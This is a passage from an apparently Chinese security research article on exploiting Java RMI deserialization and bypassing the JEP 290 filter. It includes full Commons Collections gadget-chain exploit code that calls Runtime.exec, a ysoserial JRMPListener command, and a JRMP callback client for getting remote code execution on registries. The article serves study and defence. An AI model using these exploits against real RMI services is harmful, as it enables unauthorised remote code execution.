    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.util.concurrent.CountDownLatch;
    
    public class Server {
        public static void main(String[] args) throws RemoteException, AlreadyBoundException, InterruptedException, NotBoundException {
            User liming = new LocalUser("liming",15);
            Registry registry = LocateRegistry.createRegistry(8888);
            registry.bind("user",liming);
    
            System.out.println("registry is running...");
    
            System.out.println("liming is bind in registry");
    
            CountDownLatch latch=new CountDownLatch(1);
    
            latch.await();
        }
    
    }

此时当客户端调用服务端绑定的远程对象的getUser方法时，将反序列化服务端传来的恶意远程对象。此时将触发Rce。

![-w1238](https://images.seebug.org/content/images/2020/06/22/1592803987000-63mosgv.png-w331s)

当然，这种前提是客户端也要有对应的gadget才行。

#### 远程加载对象

这个条件十分十分苛刻，在现实生活中基本不可能碰到。

当服务端的某个方法返回的对象是客户端没有的时，客户端可以指定一个URL，此时会通过URL来实例化对象。

具体可以参考这篇文章，利用条件太过于苛刻了：https://paper.seebug.org/1091/#serverrmi-server

java.security.policy这个默认是没有配置的，需要我们手动去配置。

## 攻击服务端

如何攻击服务端呢？上面已经说了用注册中心反打服务端的操作，接下来就是说客户端如何攻击服务端了。

### 当服务端的远程方法存在Object参数的情况下

在上上面写了，如果服务端的某个方法，传递的参数是Object类型的参数，当服务端接收数据时，就会调用readObject，所以我们可以从这个角度入手来攻击服务端。

前提：

  * 服务端的某个远程方法传递参数为Object

我们需要先在User接口中新增这么一个方法：

    
    
    import java.rmi.RemoteException;
    
    public interface User extends java.rmi.Remote {
        public String getName() throws RemoteException;;
        public User getUser() throws RemoteException;
        public void updateName(String name) throws RemoteException;;
        public void addUser(Object user) throws RemoteException;
    }

此时多了一个addUser方法，当客户端调用这个方法时候，服务端会对其传递的参数进行反序列化。

Client Demo：

    
    
    import org.apache.commons.collections.Transformer;
    import org.apache.commons.collections.functors.ChainedTransformer;
    import org.apache.commons.collections.functors.ConstantTransformer;
    import org.apache.commons.collections.functors.InvokerTransformer;
    
    import java.lang.reflect.Constructor;
    import java.lang.reflect.InvocationHandler;
    import java.lang.reflect.Proxy;
    import java.rmi.Remote;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    
    import java.util.HashMap;
    import java.util.Map;
    
    
    public class Client {
    
        public static void main(String[] args) throws Exception {
    
            ChainedTransformer chain = new ChainedTransformer(new Transformer[] {
                    new ConstantTransformer(Runtime.class),
                    new InvokerTransformer("getMethod", new Class[] {
                            String.class, Class[].class }, new Object[] {
                            "getRuntime", new Class[0] }),
                    new InvokerTransformer("invoke", new Class[] {
                            Object.class, Object[].class }, new Object[] {
                            null, new Object[0] }),
                    new InvokerTransformer("exec",
                            new Class[] { String.class }, new Object[]{"open  /System/Applications/Calculator.app"})});
            HashMap innermap = new HashMap();
            Class clazz = Class.forName("org.apache.commons.collections.map.LazyMap");
            Constructor[] constructors = clazz.getDeclaredConstructors();
            Constructor constructor = constructors[0];
            constructor.setAccessible(true);
            Map map = (Map)constructor.newInstance(innermap,chain);
    
    
            Constructor handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            handler_constructor.setAccessible(true);
            InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class,map); //创建第一个代理的handler
    
            Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(),new Class[]{Map.class},map_handler); //创建proxy对象
    
    
            Constructor AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class,Map.class);
            AnnotationInvocationHandler_Constructor.setAccessible(true);
            InvocationHandler handler = (InvocationHandler)AnnotationInvocationHandler_Constructor.newInstance(Override.class,proxy_map);
    
            Registry registry = LocateRegistry.getRegistry("127.0.0.1",8888);
            User user = (User) registry.lookup("user");
            user.addUser(handler);
    
        }
    }

![-w1238](https://images.seebug.org/content/images/2020/06/22/1592803987000-64qbdrj.png-w331s)

### 远程加载对象

和上边Server打Client一样，都属于十分十分十分难利用的点。

参考：<https://paper.seebug.org/1091/#serverrmi>

## 实现带回显攻击

这里说的带回显攻击，指的是攻击注册中心时，注册中心遇到异常会直接把异常发回来，返回给客户端。

先看下之前攻击注册中心时采用的方式，我们可以通过bind、lookup、unbind、rebind等方式去攻击注册中心，当我们尝试攻击时，命令确实执行了，不过注册中心的错误也会传递到我们的客户端中：

![-w1371](https://images.seebug.org/content/images/2020/06/22/1592803988000-65ifgep.png-w331s)

    
    
    Exception in thread "main" java.lang.ClassCastException: java.lang.UNIXProcess cannot be cast to java.util.Set
        at com.sun.proxy.$Proxy2.entrySet(Unknown Source)
        at sun.reflect.annotation.AnnotationInvocationHandler.readObject(AnnotationInvocationHandler.java:329)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at java.io.ObjectStreamClass.invokeReadObject(ObjectStreamClass.java:979)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1873)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1777)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1329)
        at java.io.ObjectInputStream.defaultReadFields(ObjectInputStream.java:1970)
        at java.io.ObjectInputStream.readSerialData(ObjectInputStream.java:1895)
        at java.io.ObjectInputStream.readOrdinaryObject(ObjectInputStream.java:1777)
        at java.io.ObjectInputStream.readObject0(ObjectInputStream.java:1329)
        at java.io.ObjectInputStream.readObject(ObjectInputStream.java:349)
        at sun.rmi.registry.RegistryImpl_Skel.dispatch(Unknown Source)
        at sun.rmi.server.UnicastServerRef.oldDispatch(UnicastServerRef.java:390)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:248)
        at sun.rmi.transport.Transport$1.run(Transport.java:159)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:155)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:535)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTransport.java:790)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport.java:649)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:895)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:918)
        at java.lang.Thread.run(Thread.java:695)
        at sun.rmi.transport.StreamRemoteCall.exceptionReceivedFromServer(StreamRemoteCall.java:275)
        at sun.rmi.transport.StreamRemoteCall.executeCall(StreamRemoteCall.java:252)
        at sun.rmi.server.UnicastRef.invoke(UnicastRef.java:378)
        at sun.rmi.registry.RegistryImpl_Stub.bind(Unknown Source)
        at Client.main(Client.java:55)

这一段即注册中心传递过来的错误，我们先看看当注册中心处理请求时，遇到报错的处理方式，前面说了，注册中心会在处理请求时，会调用到UnicastServerRef#dispatch来处理请求，这里会调用RegistryImpl_Skel#dispatch来处理请求：

![-w858](https://images.seebug.org/content/images/2020/06/22/1592803988000-66fwxmn.png-w331s)

重点关注红框框起来的这几段，首先是把异常赋值给了var6，之后会获取到当前socket连接到outputstream，然后写入异常，之后通过finally后边的两段代码把数据回传给客户端。

这里应该很好理解，难点是我们要如何手动的抛出一个异常，并把命令执行的结果带入异常中。

本来想找一找有没有办法可以实现不通过throws来抛出异常，但是似乎没有办法。。所以只能通过网上流传的POC，用URLClassLoader的方式来加载类。

当通过bind方法让注册中心反序列化我们的恶意序列化对象时，即可触发命令执行，通过URLClassLoader的方式加载远程jar，并调用其方法，在方法内抛出错误，错误会传回客户端。

![-w1439](https://images.seebug.org/content/images/2020/06/22/1592803989000-67bnhmq.png-w331s)

参考：<https://xz.aliyun.com/t/2223>

在做这个的时候遇到了一点问题，python自启的服务器不知道为什么没法成功被加载，只能用vps，第二个问题就是java版本的问题，如果服务器的jdk版本太高，编译的jar时用的jdk版本太低，就无法兼容，会报出一个java.lang.UnsupportedClassVersionError的错误。

# 针对RMI反序列化JDK做的一些调整

## bind && unbind && rebind

前面说了，在低版本JDK中，是可以注册中心和服务端不在一台服务器上的。

在后边修了第一次，在RegistryImpl#bind中添加了一个checkAccess方法，来检验你的来源是否为localhost。

![-w960](https://images.seebug.org/content/images/2020/06/22/1592803989000-68wxgrp.png-w331s)

此时我们虽然不能在注册中心注册服务，然而还是可以成功反序列化。这是因为注册中心在调用RegistryImpl#bind方法前就已经将我们传来的数据反序列化了。

![-w778](https://images.seebug.org/content/images/2020/06/22/1592803989000-69nikjh.png-w331s)

而在JDK8u141后，又修了一次，这次彻底解决掉在bind时反序列化的问题。

![-w807](https://images.seebug.org/content/images/2020/06/22/1592803989000-70kggmb.png-w331s)

## JEP 290 & 绕过JEP290进行攻击

### 什么是JEP290

JEP290是Java为了应对反序列化而设置的一种过滤器，理想状态是让开发者只反序列化其想反序列化的类，这样我们使用类似CC这样的，就会因为无法反序列化Tranformer、HashMap等，从而没法触发漏洞。

JEP290中对RMI设置了默认的过滤器（sun.rmi.registry.RegistryImpl#registryFilter）：

    
    
    private static Status registryFilter(FilterInfo var0) {
            if (registryFilter != null) {
                Status var1 = registryFilter.checkInput(var0);
                if (var1 != Status.UNDECIDED) {
                    return var1;
                }
            }
    
            if (var0.depth() > (long)REGISTRY_MAX_DEPTH) {
                return Status.REJECTED;
            } else {
                Class var2 = var0.serialClass();
                if (var2 == null) {
                    return Status.UNDECIDED;
                } else {
                    if (var2.isArray()) {
                        if (var0.arrayLength() >= 0L && var0.arrayLength() > (long)REGISTRY_MAX_ARRAY_SIZE) {
                            return Status.REJECTED;
                        }
    
                        do {
                            var2 = var2.getComponentType();
                        } while(var2.isArray());
                    }
    
                    if (var2.isPrimitive()) {
                        return Status.ALLOWED;
                    } else {
                        return String.class != var2 && !Number.class.isAssignableFrom(var2) && !Remote.class.isAssignableFrom(var2) && !Proxy.class.isAssignableFrom(var2) && !UnicastRef.class.isAssignableFrom(var2) && !RMIClientSocketFactory.class.isAssignableFrom(var2) && !RMIServerSocketFactory.class.isAssignableFrom(var2) && !ActivationID.class.isAssignableFrom(var2) && !UID.class.isAssignableFrom(var2) ? Status.REJECTED : Status.ALLOWED;
                    }
                }
            }
        }

从代码中可以发现，这个过滤器设置了白名单，他会判断你要反序列化的类（或者反序列化类的父类）是否在以下列表中（仅用于RmiRegistry）：

    
    
    String.class
    Remote.class
    Proxy.class
    UnicastRef.class
    RMIClientSocketFactory.class
    RMIServerSocketFactory.class
    ActivationID.class
    UID.class

如果不在，则会标记为REJECTED，此时不会反序列化成功，反之则标记为ALLOWED，此时则可以反序列化成功。

JEP290本身是JDK9的产物，但是Oracle官方做了向下移植的处理，把JEP290的机制移植到了以下三个版本以及其修复后的版本中：

  * Java? SE Development Kit 8, Update 121 (JDK 8u121)
  * Java? SE Development Kit 7, Update 131 (JDK 7u131)
  * Java? SE Development Kit 6, Update 141 (JDK 6u141)

参考：[JEP 290: Filter Incoming Serialization
Data](https://openjdk.java.net/jeps/290)

### 调用栈

    
    
    registryFilter:427, RegistryImpl (sun.rmi.registry)
    checkInput:-1, 2059904228 (sun.rmi.registry.RegistryImpl$$Lambda$2)
    filterCheck:1239, ObjectInputStream (java.io)
    readProxyDesc:1813, ObjectInputStream (java.io)
    readClassDesc:1748, ObjectInputStream (java.io)
    readOrdinaryObject:2042, ObjectInputStream (java.io)
    readObject0:1573, ObjectInputStream (java.io)
    readObject:431, ObjectInputStream (java.io)
    dispatch:76, RegistryImpl_Skel (sun.rmi.registry)
    oldDispatch:468, UnicastServerRef (sun.rmi.server)
    dispatch:300, UnicastServerRef (sun.rmi.server)
    run:200, Transport$1 (sun.rmi.transport)
    run:197, Transport$1 (sun.rmi.transport)
    doPrivileged:-1, AccessController (java.security)
    serviceCall:196, Transport (sun.rmi.transport)
    handleMessages:573, TCPTransport (sun.rmi.transport.tcp)
    run0:834, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    lambda$run$0:688, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    run:-1, 714624149 (sun.rmi.transport.tcp.TCPTransport$ConnectionHandler$$Lambda$5)
    doPrivileged:-1, AccessController (java.security)
    run:687, TCPTransport$ConnectionHandler (sun.rmi.transport.tcp)
    runWorker:1149, ThreadPoolExecutor (java.util.concurrent)
    run:624, ThreadPoolExecutor$Worker (java.util.concurrent)
    run:748, Thread (java.lang)

这里我们要明白的是，JEP290是一种机制，并不是特意为RMI准备的，之是其默认对RMI设置了过滤器，所以才会对RMI的反序列化造成影响。

从上述调用栈中可以发现，实际上是在反序列化时，会调用到readObject，而JEP290的方式，是在readObject中新增了一个filter，在filter中进行过滤。

![image-20200620164116923](https://images.seebug.org/content/images/2020/06/22/1592803989000-71xqdcn.png-w331s)

这里首先会判断有没有设置filter，如果有的话，则调用checkInput方法进行验证，如果验证不通过则直接另status为REJECTED，此时则无法正常进行反序列化。由于是内置在readObject里的，所以任何类反序列化时都会调用到这个检查。这也是为什么他会递归所有对象成员进行检查的原因。

接着我们需要找一下RMI中是如何设置filter的，这个点我找了好久，也是因为自己太不仔细的原因，JEP290是需要人工自己去设置的，而我找在哪设置filter，就是想知道为什么其他地方的readObject不需要调用这个filter进行检查，也就是想搞明白我是在哪一次反序列化会调用到这个filter进行检查。

可以先看下网上说的：

![image-20200620194625554](https://images.seebug.org/content/images/2020/06/22/1592803990000-72lxlxo.png-w331s)

![image-20200620194655655](https://images.seebug.org/content/images/2020/06/22/1592803990000-73hefco.png-w331s)

这里说了给了两种方案来设置，第一种不是，那自然就是第二种，通过setObjectInputFilter来设置filter，我下载了jdk8u131中rt.jar包的内容，丢到jadx反编译，可以搜到这个关键字：

![image-20200620194738212](https://images.seebug.org/content/images/2020/06/22/1592803990000-74dxxjv.png-w331s)

最后一行UnicastServerRef应该很熟悉，但是当时没记起来，导致卡了好半天...，跟入这个函数：

UnicastServerRef#unmarshalCustomCallData

![image-20200620194946422](https://images.seebug.org/content/images/2020/06/22/1592803990000-75qntmx.png-w331s)

在这里可以发现，他设置UnicastServerRef的filter变量作为objectInput的filter，接着可以找在哪设置了UnicastServerRef的filter变量：

![image-20200620202809321](https://images.seebug.org/content/images/2020/06/22/1592803990000-76rwaay.png-w331s)

在创建注册中心时，将前边说的registryFilter传入进去，而8u121之后的修复版本中，UnicastServerRef多了一个构造方法：

![image-20200620202912158](https://images.seebug.org/content/images/2020/06/22/1592803990000-77yuwxk.png-w331s)

这个构造方法用于设置filter变量。

接着就是找unmarshalCustomCallData这个点在哪被调用了：

UnicastServerRef#olddispatch

![image-20200620201657316](https://images.seebug.org/content/images/2020/06/22/1592803990000-78kqqpg.png-w331s)

在这里调用了unmarshalCustomCallData方法，为socket传来的inputStream设置了filter，当inputStream反序列化时，就会调用这个filter进行过滤。这里是客户端或服务端远程获取注册中心时，触发RegistryImpl_Skel的最后一步，下面会直接进入RegistryImpl_Skel#dispatch去反序列化对象：

![image-20200620201939398](https://images.seebug.org/content/images/2020/06/22/1592803991000-79zeeqc.png-w331s)

在这里，会读取刚刚设置过filter的inputStream，并反序列化，此时filter已经设置上了，所以这也是我们没有办法用之前的链直接打注册中心的原因。

对比一下7u80和8u131获取到的Registry有什么不同：

  * 7u80

![image-20200620202202027](https://images.seebug.org/content/images/2020/06/22/1592803991000-80rcnwm.png-w331s)

  * 8u131

![image-20200620202223845](https://images.seebug.org/content/images/2020/06/22/1592803991000-81gzxtn.png-w331s)

不难发现在8u131多了一个filter和几个无关变量，至此，反序列化时为什么会触发filter，在哪设置的filter都已经搞清楚了，接下来就是如何绕过了。

参考：[Java反序列化之readObject分析](https://blog.kaibro.tw/2020/02/23/Java反序列化之readObject分析/)、[Java
RMI反序列化知识详解](https://paper.seebug.org/1194/#unicastref)

### ByPass JEP290-RMI

#### 测试环境

  * JDK 8u131

如果想要在RMI中Bypass JEP290的限制，思路很明确，我们需要从上面白名单的类或者他们的子类中寻找复写readObject利用点。

#### UnicastServerRef（JDK<=8u231）

我们通过getRegistry时获得的注册中心，其实就是一个封装了UnicastServerRef对象的对象：

![image-20200620205121136](https://images.seebug.org/content/images/2020/06/22/1592803991000-82cmjqa.png-w331s)

当我们调用bind方法后，会通过UnicastRef对象中存储的信息与注册中心进行通信：

![image-20200620205310641](https://images.seebug.org/content/images/2020/06/22/1592803991000-83bdpcm.png-w331s)

这里会通过ref与注册中心通信，并将绑定的对象名称以及要绑定的远程对象发过去，注册中心在后续会对应进行反序列化，这个前面说过了，就不再重复了。

写上面这一段并不是想写如何攻击客户端，而是想说明，注册中心、 **客户端两者之间** 的通信是依赖于UnicastRef中的LiveRef的。

接着来看看yso中的JRMPClient：

    
    
    ObjID id = new ObjID(new Random().nextInt()); // RMI registry
    TCPEndpoint te = new TCPEndpoint(host, port);
    UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
    RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
    Registry proxy = (Registry) Proxy.newProxyInstance(JRMPClient.class.getClassLoader(), new Class[] {
    Registry.class
    }, obj);
    return proxy;

这里返回了一个代理对象，上面用的这些类都在白名单里，当注册中心反序列化时，会调用到RemoteObjectInvacationHandler父类RemoteObject的readObject方法（因为RemoteObjectInvacationHandler没有readObject方法），在readObject里的最后一行会调用ref.readExternal方法，并将ObjectInputStream传进去：

    
    
    ref.readExternal(in);

UnicastRef#readExternal

    
    
    public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException {
        this.ref = LiveRef.read(var1, false);
    }

LiveRef#read：

![image-20200620221055796](https://images.seebug.org/content/images/2020/06/22/1592803991000-84ejxvt.png-w331s)

这里在上边会把LiveRef对象还原，LiveRef对象中存了我们序列化进去的ip和端口，之后会调用DGCClient#registerRefs，但是不是在这里调用，是在外边经过一系列转换之后才会调到。

![image-20200620221158326](https://images.seebug.org/content/images/2020/06/22/1592803992000-85edoiv.png-w331s)

var这里转回来的是一个DGCClient对象，里边同样封装了我们的端口信息，重点关注registerRefs：

![image-20200620221508781](https://images.seebug.org/content/images/2020/06/22/1592803992000-86rewzr.png-w331s)

这里会调到DGCClient#makeDirtyCall，并把var2传进去，var2里封装了我们的endpoint信息，继续跟：

![image-20200620221811255](https://images.seebug.org/content/images/2020/06/22/1592803992000-87xsihu.png-w331s)

这里会进到dirty方法中，var4是我们传进去的ObjID对象，var2不知道是什么，var1是一个HashSet对象，里边存了我们的Endpoint信息。

dirty函数应该很熟悉了：

![image-20200620222121391](https://images.seebug.org/content/images/2020/06/22/1592803992000-88wmzxj.png-w331s)

看到这个函数的代码有木有感觉很熟悉，在客户端与服务端进行通信时，也会调用这么一个类似的方法，var6写入的两个Object是否就像是当时客户端调用服务端远程对象的方法时写入的方法名以及参数是一样的？

这里wirteObject后，会用invoke将数据发出去，接着看下边的代码：

![image-20200620222606996](https://images.seebug.org/content/images/2020/06/22/1592803992000-89urppa.png-w331s)

这里从socket连接中先读取了输入，然后直接反序列化，此时的反序列化并没有设置filter，所以这里可以直接导致注册中心rce，只要我们可以伪造一个socket连接并不把我们恶意序列化的对象发过去。

yso已经替我们做好了这一切，我们可以直接使用命令起一个恶意的服务端：

    
    
    java -cp ysoserial-0.0.6-SNAPSHOT-all.jar ysoserial.exploit.JRMPListener 1099 CommonsCollections5 "COMMAND"

这里的cc要用对应版本可以用的，这里指的对应版本是jdk8，cc1在jdk8就不可用，所以要选其他链，当我们起了恶意的服务端后，用客户端发起一个bind请求，即可触发反序列化，从而触发RCE：

![image-20200620223831609](https://images.seebug.org/content/images/2020/06/22/1592803992000-90ngazk.png-w331s)

![image-20200620223930728](https://images.seebug.org/content/images/2020/06/22/1592803993000-91cixvl.png-w331s)

对应的客户端代码：

    
    
    import sun.rmi.server.UnicastRef;
    import sun.rmi.transport.LiveRef;
    import sun.rmi.transport.tcp.TCPEndpoint;
    
    import java.lang.reflect.InvocationTargetException;
    import java.lang.reflect.Proxy;
    import java.rmi.AlreadyBoundException;
    import java.rmi.RemoteException;
    import java.rmi.registry.LocateRegistry;
    import java.rmi.registry.Registry;
    import java.rmi.server.ObjID;
    import java.rmi.server.RemoteObjectInvocationHandler;
    import java.util.Random;
    
    
    public class Client {
        public static void main(String[] args) throws RemoteException, IllegalAccessException, InvocationTargetException, InstantiationException, ClassNotFoundException, NoSuchMethodException, AlreadyBoundException {
    
            Registry reg = LocateRegistry.getRegistry("localhost",8888);
            ObjID id = new ObjID(new Random().nextInt()); // RMI registry
            TCPEndpoint te = new TCPEndpoint("127.0.0.1", 1099);
            UnicastRef ref = new UnicastRef(new LiveRef(id, te, false));
            RemoteObjectInvocationHandler obj = new RemoteObjectInvocationHandler(ref);
            Registry proxy = (Registry) Proxy.newProxyInstance(Client.class.getClassLoader(), new Class[] {
                    Registry.class
            }, obj);
            reg.bind("test12",proxy);
    
        }
    
    }

这里用bind方法只是举个例子，任意能让客户端反序列化我们传过去的数据的方法都是ok的，比如lookup、unbind、rebind等。

* * *

![Paper](https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg)
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<https://paper.seebug.org/1251/>

